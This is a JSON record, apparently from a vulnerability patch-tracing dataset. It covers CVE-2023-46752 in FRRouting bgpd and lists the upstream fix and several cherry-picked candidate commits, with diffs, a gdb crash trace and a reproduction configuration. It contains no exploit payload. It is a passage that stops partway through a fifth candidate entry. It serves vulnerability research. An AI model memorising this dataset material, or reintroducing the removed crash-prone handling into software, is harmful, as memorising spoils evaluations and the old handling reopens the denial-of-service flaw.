{
  "cve_id": "CVE-2023-46752",
  "cve_desc": "An issue was discovered in FRRouting FRR through 9.0.1. It mishandles malformed MP_REACH_NLRI data, leading to a crash.",
  "repo": "FRRouting/frr",
  "patch_hash": "b08afc81c60607a4f736f418f2e3eb06087f1a35",
  "patch_info": {
    "commit_hash": "b08afc81c60607a4f736f418f2e3eb06087f1a35",
    "repo": "FRRouting/frr",
    "commit_url": "https://github.com/FRRouting/frr/commit/b08afc81c60607a4f736f418f2e3eb06087f1a35",
    "files": [
      "bgpd/bgp_attr.c",
      "bgpd/bgp_attr.h",
      "bgpd/bgp_packet.c"
    ],
    "message": "bgpd: Handle MP_REACH_NLRI malformed packets with session reset\n\nAvoid crashing bgpd.\n\n```\n(gdb)\nbgp_mp_reach_parse (args=<optimized out>, mp_update=0x7fffffffe140) at bgpd/bgp_attr.c:2341\n2341\t\t\tstream_get(&attr->mp_nexthop_global, s, IPV6_MAX_BYTELEN);\n(gdb)\nstream_get (dst=0x7fffffffe1ac, s=0x7ffff0006e80, size=16) at lib/stream.c:320\n320\t{\n(gdb)\n321\t\tSTREAM_VERIFY_SANE(s);\n(gdb)\n323\t\tif (STREAM_READABLE(s) < size) {\n(gdb)\n34\t  return __builtin___memcpy_chk (__dest, __src, __len, __bos0 (__dest));\n(gdb)\n\nThread 1 \"bgpd\" received signal SIGSEGV, Segmentation fault.\n0x00005555556e37be in route_set_aspath_prepend (rule=0x555555aac0d0, prefix=0x7fffffffe050,\n    object=0x7fffffffdb00) at bgpd/bgp_routemap.c:2282\n2282\t\tif (path->attr->aspath->refcnt)\n(gdb)\n```\n\nWith the configuration:\n\n```\n neighbor 127.0.0.1 remote-as external\n neighbor 127.0.0.1 passive\n neighbor 127.0.0.1 ebgp-multihop\n neighbor 127.0.0.1 disable-connected-check\n neighbor 127.0.0.1 update-source 127.0.0.2\n neighbor 127.0.0.1 timers 3 90\n neighbor 127.0.0.1 timers connect 1\n address-family ipv4 unicast\n  redistribute connected\n  neighbor 127.0.0.1 default-originate\n  neighbor 127.0.0.1 route-map RM_IN in\n exit-address-family\n!\nroute-map RM_IN permit 10\n set as-path prepend 200\nexit\n```\n\nReported-by: Iggy Frankovic <iggyfran@amazon.com>\nSigned-off-by: Donatas Abraitis <donatas@opensourcerouting.org>",
    "before_after_code_files": [
      "bgpd/bgp_attr.c||bgpd/bgp_attr.c",
      "bgpd/bgp_attr.h||bgpd/bgp_attr.h",
      "bgpd/bgp_packet.c||bgpd/bgp_packet.c"
    ]
  },
  "patch_diff": {
    "bgpd/bgp_attr.c||bgpd/bgp_attr.c": [
      "File: bgpd/bgp_attr.c -> bgpd/bgp_attr.c",
      "--- Hunk 1 ---",
      "[Context before]",
      "2422:   mp_update->afi = afi;",
      "2423:   mp_update->safi = safi;",
      "2425:  }",
      "2427:  mp_update->afi = afi;",
      "",
      "[Removed Lines]",
      "2424:   return BGP_ATTR_PARSE_EOR;",
      "",
      "[Added Lines]",
      "2424:   return bgp_attr_malformed(args, BGP_NOTIFY_UPDATE_MAL_ATTR, 0);",
      "",
      "---------------",
      "--- Hunk 2 ---",
      "[Context before]",
      "3759:    goto done;",
      "3760:   }",
      "3766:   if (ret == BGP_ATTR_PARSE_ERROR) {",
      "3767:    flog_warn(EC_BGP_ATTRIBUTE_PARSE_ERROR,",
      "3768:       \"%s: Attribute %s, parse error\", peer->host,",
      "",
      "[Removed Lines]",
      "3762:   if (ret == BGP_ATTR_PARSE_EOR) {",
      "3763:    goto done;",
      "3764:   }",
      "",
      "[Added Lines]",
      "[None]",
      "",
      "---------------"
    ],
    "bgpd/bgp_attr.h||bgpd/bgp_attr.h": [
      "File: bgpd/bgp_attr.h -> bgpd/bgp_attr.h",
      "--- Hunk 1 ---",
      "[Context before]",
      "366:  BGP_ATTR_PARSE_ERROR_NOTIFYPLS = -3,",
      "368: };",
      "370: struct bpacket_attr_vec_arr;",
      "",
      "[Removed Lines]",
      "367:  BGP_ATTR_PARSE_EOR = -4,",
      "",
      "[Added Lines]",
      "[None]",
      "",
      "---------------"
    ],
    "bgpd/bgp_packet.c||bgpd/bgp_packet.c": [
      "File: bgpd/bgp_packet.c -> bgpd/bgp_packet.c",
      "--- Hunk 1 ---",
      "[Context before]",
      "2402:   afi_t afi = 0;",
      "2403:   safi_t safi;",
      "2404:   struct graceful_restart_info *gr_info;",
      "",
      "[Removed Lines]",
      "2400:  if ((!update_len && !withdraw_len && nlris[NLRI_MP_UPDATE].length == 0)",
      "2401:      || (attr_parse_ret == BGP_ATTR_PARSE_EOR)) {",
      "",
      "[Added Lines]",
      "2400:  if (!update_len && !withdraw_len && nlris[NLRI_MP_UPDATE].length == 0) {",
      "",
      "---------------",
      "--- Hunk 2 ---",
      "[Context before]",
      "2419:       && nlris[NLRI_MP_WITHDRAW].length == 0) {",
      "2420:    afi = nlris[NLRI_MP_WITHDRAW].afi;",
      "2421:    safi = nlris[NLRI_MP_WITHDRAW].safi;",
      "2425:   }",
      "2427:   if (afi && peer->afc[afi][safi]) {",
      "",
      "[Removed Lines]",
      "2422:   } else if (attr_parse_ret == BGP_ATTR_PARSE_EOR) {",
      "2423:    afi = nlris[NLRI_MP_UPDATE].afi;",
      "2424:    safi = nlris[NLRI_MP_UPDATE].safi;",
      "",
      "[Added Lines]",
      "[None]",
      "",
      "---------------"
    ]
  },
  "candidates": [
    {
      "candidate_hash": "d19727b4ac595f17da530f5fa0bbd3bb16ea2aa1",
      "candidate_info": {
        "commit_hash": "d19727b4ac595f17da530f5fa0bbd3bb16ea2aa1",
        "repo": "FRRouting/frr",
        "commit_url": "https://github.com/FRRouting/frr/commit/d19727b4ac595f17da530f5fa0bbd3bb16ea2aa1",
        "files": [
          "bgpd/bgp_attr.c",
          "bgpd/bgp_attr.h",
          "bgpd/bgp_packet.c"
        ],
        "message": "bgpd: Handle MP_REACH_NLRI malformed packets with session reset\n\nAvoid crashing bgpd.\n\n```\n(gdb)\nbgp_mp_reach_parse (args=<optimized out>, mp_update=0x7fffffffe140) at bgpd/bgp_attr.c:2341\n2341\t\t\tstream_get(&attr->mp_nexthop_global, s, IPV6_MAX_BYTELEN);\n(gdb)\nstream_get (dst=0x7fffffffe1ac, s=0x7ffff0006e80, size=16) at lib/stream.c:320\n320\t{\n(gdb)\n321\t\tSTREAM_VERIFY_SANE(s);\n(gdb)\n323\t\tif (STREAM_READABLE(s) < size) {\n(gdb)\n34\t  return __builtin___memcpy_chk (__dest, __src, __len, __bos0 (__dest));\n(gdb)\n\nThread 1 \"bgpd\" received signal SIGSEGV, Segmentation fault.\n0x00005555556e37be in route_set_aspath_prepend (rule=0x555555aac0d0, prefix=0x7fffffffe050,\n    object=0x7fffffffdb00) at bgpd/bgp_routemap.c:2282\n2282\t\tif (path->attr->aspath->refcnt)\n(gdb)\n```\n\nWith the configuration:\n\n```\n neighbor 127.0.0.1 remote-as external\n neighbor 127.0.0.1 passive\n neighbor 127.0.0.1 ebgp-multihop\n neighbor 127.0.0.1 disable-connected-check\n neighbor 127.0.0.1 update-source 127.0.0.2\n neighbor 127.0.0.1 timers 3 90\n neighbor 127.0.0.1 timers connect 1\n address-family ipv4 unicast\n  redistribute connected\n  neighbor 127.0.0.1 default-originate\n  neighbor 127.0.0.1 route-map RM_IN in\n exit-address-family\n!\nroute-map RM_IN permit 10\n set as-path prepend 200\nexit\n```\n\nReported-by: Iggy Frankovic <iggyfran@amazon.com>\nSigned-off-by: Donatas Abraitis <donatas@opensourcerouting.org>\n(cherry picked from commit b08afc81c60607a4f736f418f2e3eb06087f1a35)",
        "before_after_code_files": [
          "bgpd/bgp_attr.c||bgpd/bgp_attr.c",
          "bgpd/bgp_attr.h||bgpd/bgp_attr.h",
          "bgpd/bgp_packet.c||bgpd/bgp_packet.c"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "diff_branch_cherry_pick": 1,
        "diff_branch_same_aad": 1,
        "olp_code_files": {
          "patch": [
            "bgpd/bgp_attr.c||bgpd/bgp_attr.c",
            "bgpd/bgp_attr.h||bgpd/bgp_attr.h",
            "bgpd/bgp_packet.c||bgpd/bgp_packet.c"
          ],
          "candidate": [
            "bgpd/bgp_attr.c||bgpd/bgp_attr.c",
            "bgpd/bgp_attr.h||bgpd/bgp_attr.h",
            "bgpd/bgp_packet.c||bgpd/bgp_packet.c"
          ]
        }
      },
      "candidate_diff": {
        "bgpd/bgp_attr.c||bgpd/bgp_attr.c": [
          "File: bgpd/bgp_attr.c -> bgpd/bgp_attr.c",
          "--- Hunk 1 ---",
          "[Context before]",
          "2389:   mp_update->afi = afi;",
          "2390:   mp_update->safi = safi;",
          "2392:  }",
          "2394:  mp_update->afi = afi;",
          "",
          "[Removed Lines]",
          "2391:   return BGP_ATTR_PARSE_EOR;",
          "",
          "[Added Lines]",
          "2391:   return bgp_attr_malformed(args, BGP_NOTIFY_UPDATE_MAL_ATTR, 0);",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "3658:    goto done;",
          "3659:   }",
          "3665:   if (ret == BGP_ATTR_PARSE_ERROR) {",
          "3666:    flog_warn(EC_BGP_ATTRIBUTE_PARSE_ERROR,",
          "3667:       \"%s: Attribute %s, parse error\", peer->host,",
          "",
          "[Removed Lines]",
          "3661:   if (ret == BGP_ATTR_PARSE_EOR) {",
          "3662:    goto done;",
          "3663:   }",
          "",
          "[Added Lines]",
          "[None]",
          "",
          "---------------"
        ],
        "bgpd/bgp_attr.h||bgpd/bgp_attr.h": [
          "File: bgpd/bgp_attr.h -> bgpd/bgp_attr.h",
          "--- Hunk 1 ---",
          "[Context before]",
          "366:  BGP_ATTR_PARSE_ERROR_NOTIFYPLS = -3,",
          "368: };",
          "370: struct bpacket_attr_vec_arr;",
          "",
          "[Removed Lines]",
          "367:  BGP_ATTR_PARSE_EOR = -4,",
          "",
          "[Added Lines]",
          "[None]",
          "",
          "---------------"
        ],
        "bgpd/bgp_packet.c||bgpd/bgp_packet.c": [
          "File: bgpd/bgp_packet.c -> bgpd/bgp_packet.c",
          "--- Hunk 1 ---",
          "[Context before]",
          "2058:   afi_t afi = 0;",
          "2059:   safi_t safi;",
          "2060:   struct graceful_restart_info *gr_info;",
          "",
          "[Removed Lines]",
          "2056:  if ((!update_len && !withdraw_len && nlris[NLRI_MP_UPDATE].length == 0)",
          "2057:      || (attr_parse_ret == BGP_ATTR_PARSE_EOR)) {",
          "",
          "[Added Lines]",
          "2056:  if (!update_len && !withdraw_len && nlris[NLRI_MP_UPDATE].length == 0) {",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "2075:       && nlris[NLRI_MP_WITHDRAW].length == 0) {",
          "2076:    afi = nlris[NLRI_MP_WITHDRAW].afi;",
          "2077:    safi = nlris[NLRI_MP_WITHDRAW].safi;",
          "2081:   }",
          "2083:   if (afi && peer->afc[afi][safi]) {",
          "",
          "[Removed Lines]",
          "2078:   } else if (attr_parse_ret == BGP_ATTR_PARSE_EOR) {",
          "2079:    afi = nlris[NLRI_MP_UPDATE].afi;",
          "2080:    safi = nlris[NLRI_MP_UPDATE].safi;",
          "",
          "[Added Lines]",
          "[None]",
          "",
          "---------------"
        ]
      }
    },
    {
      "candidate_hash": "30b5c2a434d25981e16792f6f50162beb517ae4d",
      "candidate_info": {
        "commit_hash": "30b5c2a434d25981e16792f6f50162beb517ae4d",
        "repo": "FRRouting/frr",
        "commit_url": "https://github.com/FRRouting/frr/commit/30b5c2a434d25981e16792f6f50162beb517ae4d",
        "files": [
          "bgpd/bgp_attr.c",
          "bgpd/bgp_attr.h",
          "bgpd/bgp_packet.c"
        ],
        "message": "bgpd: Handle MP_REACH_NLRI malformed packets with session reset\n\nAvoid crashing bgpd.\n\n```\n(gdb)\nbgp_mp_reach_parse (args=<optimized out>, mp_update=0x7fffffffe140) at bgpd/bgp_attr.c:2341\n2341\t\t\tstream_get(&attr->mp_nexthop_global, s, IPV6_MAX_BYTELEN);\n(gdb)\nstream_get (dst=0x7fffffffe1ac, s=0x7ffff0006e80, size=16) at lib/stream.c:320\n320\t{\n(gdb)\n321\t\tSTREAM_VERIFY_SANE(s);\n(gdb)\n323\t\tif (STREAM_READABLE(s) < size) {\n(gdb)\n34\t  return __builtin___memcpy_chk (__dest, __src, __len, __bos0 (__dest));\n(gdb)\n\nThread 1 \"bgpd\" received signal SIGSEGV, Segmentation fault.\n0x00005555556e37be in route_set_aspath_prepend (rule=0x555555aac0d0, prefix=0x7fffffffe050,\n    object=0x7fffffffdb00) at bgpd/bgp_routemap.c:2282\n2282\t\tif (path->attr->aspath->refcnt)\n(gdb)\n```\n\nWith the configuration:\n\n```\n neighbor 127.0.0.1 remote-as external\n neighbor 127.0.0.1 passive\n neighbor 127.0.0.1 ebgp-multihop\n neighbor 127.0.0.1 disable-connected-check\n neighbor 127.0.0.1 update-source 127.0.0.2\n neighbor 127.0.0.1 timers 3 90\n neighbor 127.0.0.1 timers connect 1\n address-family ipv4 unicast\n  redistribute connected\n  neighbor 127.0.0.1 default-originate\n  neighbor 127.0.0.1 route-map RM_IN in\n exit-address-family\n!\nroute-map RM_IN permit 10\n set as-path prepend 200\nexit\n```\n\nReported-by: Iggy Frankovic <iggyfran@amazon.com>\nSigned-off-by: Donatas Abraitis <donatas@opensourcerouting.org>\n(cherry picked from commit b08afc81c60607a4f736f418f2e3eb06087f1a35)",
        "before_after_code_files": [
          "bgpd/bgp_attr.c||bgpd/bgp_attr.c",
          "bgpd/bgp_attr.h||bgpd/bgp_attr.h",
          "bgpd/bgp_packet.c||bgpd/bgp_packet.c"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "diff_branch_cherry_pick": 1,
        "diff_branch_same_aad": 1,
        "olp_code_files": {
          "patch": [
            "bgpd/bgp_attr.c||bgpd/bgp_attr.c",
            "bgpd/bgp_attr.h||bgpd/bgp_attr.h",
            "bgpd/bgp_packet.c||bgpd/bgp_packet.c"
          ],
          "candidate": [
            "bgpd/bgp_attr.c||bgpd/bgp_attr.c",
            "bgpd/bgp_attr.h||bgpd/bgp_attr.h",
            "bgpd/bgp_packet.c||bgpd/bgp_packet.c"
          ]
        }
      },
      "candidate_diff": {
        "bgpd/bgp_attr.c||bgpd/bgp_attr.c": [
          "File: bgpd/bgp_attr.c -> bgpd/bgp_attr.c",
          "--- Hunk 1 ---",
          "[Context before]",
          "2419:   mp_update->afi = afi;",
          "2420:   mp_update->safi = safi;",
          "2422:  }",
          "2424:  mp_update->afi = afi;",
          "",
          "[Removed Lines]",
          "2421:   return BGP_ATTR_PARSE_EOR;",
          "",
          "[Added Lines]",
          "2421:   return bgp_attr_malformed(args, BGP_NOTIFY_UPDATE_MAL_ATTR, 0);",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "3709:    goto done;",
          "3710:   }",
          "3716:   if (ret == BGP_ATTR_PARSE_ERROR) {",
          "3717:    flog_warn(EC_BGP_ATTRIBUTE_PARSE_ERROR,",
          "3718:       \"%s: Attribute %s, parse error\", peer->host,",
          "",
          "[Removed Lines]",
          "3712:   if (ret == BGP_ATTR_PARSE_EOR) {",
          "3713:    goto done;",
          "3714:   }",
          "",
          "[Added Lines]",
          "[None]",
          "",
          "---------------"
        ],
        "bgpd/bgp_attr.h||bgpd/bgp_attr.h": [
          "File: bgpd/bgp_attr.h -> bgpd/bgp_attr.h",
          "--- Hunk 1 ---",
          "[Context before]",
          "381:  BGP_ATTR_PARSE_ERROR_NOTIFYPLS = -3,",
          "383: };",
          "385: struct bpacket_attr_vec_arr;",
          "",
          "[Removed Lines]",
          "382:  BGP_ATTR_PARSE_EOR = -4,",
          "",
          "[Added Lines]",
          "[None]",
          "",
          "---------------"
        ],
        "bgpd/bgp_packet.c||bgpd/bgp_packet.c": [
          "File: bgpd/bgp_packet.c -> bgpd/bgp_packet.c",
          "--- Hunk 1 ---",
          "[Context before]",
          "2065:   afi_t afi = 0;",
          "2066:   safi_t safi;",
          "2067:   struct graceful_restart_info *gr_info;",
          "",
          "[Removed Lines]",
          "2063:  if ((!update_len && !withdraw_len && nlris[NLRI_MP_UPDATE].length == 0)",
          "2064:      || (attr_parse_ret == BGP_ATTR_PARSE_EOR)) {",
          "",
          "[Added Lines]",
          "2063:  if (!update_len && !withdraw_len && nlris[NLRI_MP_UPDATE].length == 0) {",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "2082:       && nlris[NLRI_MP_WITHDRAW].length == 0) {",
          "2083:    afi = nlris[NLRI_MP_WITHDRAW].afi;",
          "2084:    safi = nlris[NLRI_MP_WITHDRAW].safi;",
          "2088:   }",
          "2090:   if (afi && peer->afc[afi][safi]) {",
          "",
          "[Removed Lines]",
          "2085:   } else if (attr_parse_ret == BGP_ATTR_PARSE_EOR) {",
          "2086:    afi = nlris[NLRI_MP_UPDATE].afi;",
          "2087:    safi = nlris[NLRI_MP_UPDATE].safi;",
          "",
          "[Added Lines]",
          "[None]",
          "",
          "---------------"
        ]
      }
    },
    {
      "candidate_hash": "8ec1d39b2767b7f90b888645df75ab41e9923f7a",
      "candidate_info": {
        "commit_hash": "8ec1d39b2767b7f90b888645df75ab41e9923f7a",
        "repo": "FRRouting/frr",
        "commit_url": "https://github.com/FRRouting/frr/commit/8ec1d39b2767b7f90b888645df75ab41e9923f7a",
        "files": [
          "bgpd/bgp_attr.c",
          "bgpd/bgp_attr.h",
          "bgpd/bgp_packet.c"
        ],
        "message": "bgpd: Handle MP_REACH_NLRI malformed packets with session reset\n\nAvoid crashing bgpd.\n\n```\n(gdb)\nbgp_mp_reach_parse (args=<optimized out>, mp_update=0x7fffffffe140) at bgpd/bgp_attr.c:2341\n2341\t\t\tstream_get(&attr->mp_nexthop_global, s, IPV6_MAX_BYTELEN);\n(gdb)\nstream_get (dst=0x7fffffffe1ac, s=0x7ffff0006e80, size=16) at lib/stream.c:320\n320\t{\n(gdb)\n321\t\tSTREAM_VERIFY_SANE(s);\n(gdb)\n323\t\tif (STREAM_READABLE(s) < size) {\n(gdb)\n34\t  return __builtin___memcpy_chk (__dest, __src, __len, __bos0 (__dest));\n(gdb)\n\nThread 1 \"bgpd\" received signal SIGSEGV, Segmentation fault.\n0x00005555556e37be in route_set_aspath_prepend (rule=0x555555aac0d0, prefix=0x7fffffffe050,\n    object=0x7fffffffdb00) at bgpd/bgp_routemap.c:2282\n2282\t\tif (path->attr->aspath->refcnt)\n(gdb)\n```\n\nWith the configuration:\n\n```\n neighbor 127.0.0.1 remote-as external\n neighbor 127.0.0.1 passive\n neighbor 127.0.0.1 ebgp-multihop\n neighbor 127.0.0.1 disable-connected-check\n neighbor 127.0.0.1 update-source 127.0.0.2\n neighbor 127.0.0.1 timers 3 90\n neighbor 127.0.0.1 timers connect 1\n address-family ipv4 unicast\n  redistribute connected\n  neighbor 127.0.0.1 default-originate\n  neighbor 127.0.0.1 route-map RM_IN in\n exit-address-family\n!\nroute-map RM_IN permit 10\n set as-path prepend 200\nexit\n```\n\nReported-by: Iggy Frankovic <iggyfran@amazon.com>\nSigned-off-by: Donatas Abraitis <donatas@opensourcerouting.org>\n(cherry picked from commit b08afc81c60607a4f736f418f2e3eb06087f1a35)",
        "before_after_code_files": [
          "bgpd/bgp_attr.c||bgpd/bgp_attr.c",
          "bgpd/bgp_attr.h||bgpd/bgp_attr.h",
          "bgpd/bgp_packet.c||bgpd/bgp_packet.c"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "diff_branch_cherry_pick": 1,
        "diff_branch_same_aad": 1,
        "olp_code_files": {
          "patch": [
            "bgpd/bgp_attr.c||bgpd/bgp_attr.c",
            "bgpd/bgp_attr.h||bgpd/bgp_attr.h",
            "bgpd/bgp_packet.c||bgpd/bgp_packet.c"
          ],
          "candidate": [
            "bgpd/bgp_attr.c||bgpd/bgp_attr.c",
            "bgpd/bgp_attr.h||bgpd/bgp_attr.h",
            "bgpd/bgp_packet.c||bgpd/bgp_packet.c"
          ]
        }
      },
      "candidate_diff": {
        "bgpd/bgp_attr.c||bgpd/bgp_attr.c": [
          "File: bgpd/bgp_attr.c -> bgpd/bgp_attr.c",
          "--- Hunk 1 ---",
          "[Context before]",
          "2423:   mp_update->afi = afi;",
          "2424:   mp_update->safi = safi;",
          "2426:  }",
          "2428:  mp_update->afi = afi;",
          "",
          "[Removed Lines]",
          "2425:   return BGP_ATTR_PARSE_EOR;",
          "",
          "[Added Lines]",
          "2425:   return bgp_attr_malformed(args, BGP_NOTIFY_UPDATE_MAL_ATTR, 0);",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "3759:    goto done;",
          "3760:   }",
          "3766:   if (ret == BGP_ATTR_PARSE_ERROR) {",
          "3767:    flog_warn(EC_BGP_ATTRIBUTE_PARSE_ERROR,",
          "3768:       \"%s: Attribute %s, parse error\", peer->host,",
          "",
          "[Removed Lines]",
          "3762:   if (ret == BGP_ATTR_PARSE_EOR) {",
          "3763:    goto done;",
          "3764:   }",
          "",
          "[Added Lines]",
          "[None]",
          "",
          "---------------"
        ],
        "bgpd/bgp_attr.h||bgpd/bgp_attr.h": [
          "File: bgpd/bgp_attr.h -> bgpd/bgp_attr.h",
          "--- Hunk 1 ---",
          "[Context before]",
          "366:  BGP_ATTR_PARSE_ERROR_NOTIFYPLS = -3,",
          "368: };",
          "370: struct bpacket_attr_vec_arr;",
          "",
          "[Removed Lines]",
          "367:  BGP_ATTR_PARSE_EOR = -4,",
          "",
          "[Added Lines]",
          "[None]",
          "",
          "---------------"
        ],
        "bgpd/bgp_packet.c||bgpd/bgp_packet.c": [
          "File: bgpd/bgp_packet.c -> bgpd/bgp_packet.c",
          "--- Hunk 1 ---",
          "[Context before]",
          "2247:   afi_t afi = 0;",
          "2248:   safi_t safi;",
          "2249:   struct graceful_restart_info *gr_info;",
          "",
          "[Removed Lines]",
          "2245:  if ((!update_len && !withdraw_len && nlris[NLRI_MP_UPDATE].length == 0)",
          "2246:      || (attr_parse_ret == BGP_ATTR_PARSE_EOR)) {",
          "",
          "[Added Lines]",
          "2245:  if (!update_len && !withdraw_len && nlris[NLRI_MP_UPDATE].length == 0) {",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "2264:       && nlris[NLRI_MP_WITHDRAW].length == 0) {",
          "2265:    afi = nlris[NLRI_MP_WITHDRAW].afi;",
          "2266:    safi = nlris[NLRI_MP_WITHDRAW].safi;",
          "2270:   }",
          "2272:   if (afi && peer->afc[afi][safi]) {",
          "",
          "[Removed Lines]",
          "2267:   } else if (attr_parse_ret == BGP_ATTR_PARSE_EOR) {",
          "2268:    afi = nlris[NLRI_MP_UPDATE].afi;",
          "2269:    safi = nlris[NLRI_MP_UPDATE].safi;",
          "",
          "[Added Lines]",
          "[None]",
          "",
          "---------------"
        ]
      }
    },
    {
      "candidate_hash": "adb99e47ffc9eed01b467c4cc35ab8513c73a5b8",
      "candidate_info": {
        "commit_hash": "adb99e47ffc9eed01b467c4cc35ab8513c73a5b8",
        "repo": "FRRouting/frr",
        "commit_url": "https://github.com/FRRouting/frr/commit/adb99e47ffc9eed01b467c4cc35ab8513c73a5b8",
        "files": [
          "bgpd/bgp_attr.c",
          "bgpd/bgp_attr.h",
          "bgpd/bgp_packet.c"
        ],
        "message": "bgpd: Handle MP_REACH_NLRI malformed packets with session reset\n\nAvoid crashing bgpd.\n\n```\n(gdb)\nbgp_mp_reach_parse (args=<optimized out>, mp_update=0x7fffffffe140) at bgpd/bgp_attr.c:2341\n2341\t\t\tstream_get(&attr->mp_nexthop_global, s, IPV6_MAX_BYTELEN);\n(gdb)\nstream_get (dst=0x7fffffffe1ac, s=0x7ffff0006e80, size=16) at lib/stream.c:320\n320\t{\n(gdb)\n321\t\tSTREAM_VERIFY_SANE(s);\n(gdb)\n323\t\tif (STREAM_READABLE(s) < size) {\n(gdb)\n34\t  return __builtin___memcpy_chk (__dest, __src, __len, __bos0 (__dest));\n(gdb)\n\nThread 1 \"bgpd\" received signal SIGSEGV, Segmentation fault.\n0x00005555556e37be in route_set_aspath_prepend (rule=0x555555aac0d0, prefix=0x7fffffffe050,\n    object=0x7fffffffdb00) at bgpd/bgp_routemap.c:2282\n2282\t\tif (path->attr->aspath->refcnt)\n(gdb)\n```\n\nWith the configuration:\n\n```\n neighbor 127.0.0.1 remote-as external\n neighbor 127.0.0.1 passive\n neighbor 127.0.0.1 ebgp-multihop\n neighbor 127.0.0.1 disable-connected-check\n neighbor 127.0.0.1 update-source 127.0.0.2\n neighbor 127.0.0.1 timers 3 90\n neighbor 127.0.0.1 timers connect 1\n address-family ipv4 unicast\n  redistribute connected\n  neighbor 127.0.0.1 default-originate\n  neighbor 127.0.0.1 route-map RM_IN in\n exit-address-family\n!\nroute-map RM_IN permit 10\n set as-path prepend 200\nexit\n```\n\nReported-by: Iggy Frankovic <iggyfran@amazon.com>\nSigned-off-by: Donatas Abraitis <donatas@opensourcerouting.org>\n(cherry picked from commit b08afc81c60607a4f736f418f2e3eb06087f1a35)",
        "before_after_code_files": [
          "bgpd/bgp_attr.c||bgpd/bgp_attr.c",
          "bgpd/bgp_attr.h||bgpd/bgp_attr.h",
          "bgpd/bgp_packet.c||bgpd/bgp_packet.c"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "diff_branch_cherry_pick": 1,
        "diff_branch_same_aad": 1,
        "olp_code_files": {
          "patch": [
            "bgpd/bgp_attr.c||bgpd/bgp_attr.c",
            "bgpd/bgp_attr.h||bgpd/bgp_attr.h",
            "bgpd/bgp_packet.c||bgpd/bgp_packet.c"
          ],
          "candidate": [
            "bgpd/bgp_attr.c||bgpd/bgp_attr.c",
            "bgpd/bgp_attr.h||bgpd/bgp_attr.h",
            "bgpd/bgp_packet.c||bgpd/bgp_packet.c"
          ]
        }
      },
      "candidate_diff": {
        "bgpd/bgp_attr.c||bgpd/bgp_attr.c": [
          "File: bgpd/bgp_attr.c -> bgpd/bgp_attr.c",
          "--- Hunk 1 ---",
          "[Context before]",
          "2233:   mp_update->afi = afi;",
          "2234:   mp_update->safi = safi;",
          "2236:  }",
          "2238:  mp_update->afi = afi;",
          "",
          "[Removed Lines]",
          "2235:   return BGP_ATTR_PARSE_EOR;",
          "",
          "[Added Lines]",
          "2235:   return bgp_attr_malformed(args, BGP_NOTIFY_UPDATE_MAL_ATTR, 0);",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "3412:    goto done;",
          "3413:   }",
          "3419:   if (ret == BGP_ATTR_PARSE_ERROR) {",
          "3420:    flog_warn(EC_BGP_ATTRIBUTE_PARSE_ERROR,",
          "3421:       \"%s: Attribute %s, parse error\", peer->host,",
          "",
          "[Removed Lines]",
          "3415:   if (ret == BGP_ATTR_PARSE_EOR) {",
          "3416:    goto done;",
          "3417:   }",
          "",
          "[Added Lines]",
          "[None]",
          "",
          "---------------"
        ],
        "bgpd/bgp_attr.h||bgpd/bgp_attr.h": [
          "File: bgpd/bgp_attr.h -> bgpd/bgp_attr.h",
          "--- Hunk 1 ---",
          "[Context before]",
          "384:  BGP_ATTR_PARSE_ERROR_NOTIFYPLS = -3,",
          "386: };",
          "388: struct bpacket_attr_vec_arr;",
          "",
          "[Removed Lines]",
          "385:  BGP_ATTR_PARSE_EOR = -4,",
          "",
          "[Added Lines]",
          "[None]",
          "",
          "---------------"
        ],
        "bgpd/bgp_packet.c||bgpd/bgp_packet.c": [
          "File: bgpd/bgp_packet.c -> bgpd/bgp_packet.c",
          "--- Hunk 1 ---",
          "[Context before]",
          "2032:   afi_t afi = 0;",
          "2033:   safi_t safi;",
          "2034:   struct graceful_restart_info *gr_info;",
          "",
          "[Removed Lines]",
          "2030:  if ((!update_len && !withdraw_len && nlris[NLRI_MP_UPDATE].length == 0)",
          "2031:      || (attr_parse_ret == BGP_ATTR_PARSE_EOR)) {",
          "",
          "[Added Lines]",
          "2030:  if (!update_len && !withdraw_len && nlris[NLRI_MP_UPDATE].length == 0) {",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "2049:       && nlris[NLRI_MP_WITHDRAW].length == 0) {",
          "2050:    afi = nlris[NLRI_MP_WITHDRAW].afi;",
          "2051:    safi = nlris[NLRI_MP_WITHDRAW].safi;",
          "2055:   }",
          "2057:   if (afi && peer->afc[afi][safi]) {",
          "",
          "[Removed Lines]",
          "2052:   } else if (attr_parse_ret == BGP_ATTR_PARSE_EOR) {",
          "2053:    afi = nlris[NLRI_MP_UPDATE].afi;",
          "2054:    safi = nlris[NLRI_MP_UPDATE].safi;",
          "",
          "[Added Lines]",
          "[None]",
          "",
          "---------------"
        ]
      }
    },
    {
      "candidate_hash": "d8482bf011cb2b173e85b65b4bf3d5061250cdb9",
      "candidate_info": {
        "commit_hash": "d8482bf011cb2b173e85b65b4bf3d5061250cdb9",
        "repo": "FRRouting/frr",
        "commit_url": "https://github.com/FRRouting/frr/commit/d8482bf011cb2b173e85b65b4bf3d5061250cdb9",
        "files": [
          "bgpd/bgp_attr.c"
        ],
